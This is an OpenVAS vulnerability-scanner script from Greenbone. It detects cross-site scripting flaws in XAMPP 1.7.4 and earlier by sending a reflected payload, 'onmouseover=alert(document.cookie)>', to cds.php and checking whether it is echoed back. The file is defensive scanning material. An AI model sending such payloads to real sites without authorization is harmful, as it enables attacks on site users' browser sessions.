###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xampp_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# XAMPP Web Server Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "XAMPP version 1.7.4 and prior";
tag_insight = "Multiple flaws are due to improper validation of user-supplied input
  to the 'text' parameter in 'ming.php' and input appended to the URL in
  cds.php, that allows attackers to execute arbitrary HTML and script code
  in a user's browser session in the context of an affected site.";
tag_solution = "Upgrade to XAMPP version 1.7.7 or later.
  For updates refer to http://www.apachefriends.org/en/xampp.html";
tag_summary = "This host is running XAMPP and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(802261);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-10-28 16:17:13 +0200 (Fri, 28 Oct 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("XAMPP Web Server Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/106244/xampp174-xss.txt");
  script_xref(name : "URL" , value : "http://mc-crew.info/xampp-1-7-4-for-windows-multiple-site-scripting-vulnerabilities");

  script_description(desc);
  script_summary("Check if XAMPP is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/xampp", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir, "/start.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application before trying exploit
  if("XAMPP" >< res)
  {
    ## Construct Attack Request
    url = dir + "/cds.php/'onmouseover=alert(document.cookie)>";
    req = http_get(item:url, port:port);

    ## Try XSS Attack
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
       "cds.php/'onmouseover=alert(document.cookie)>" >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
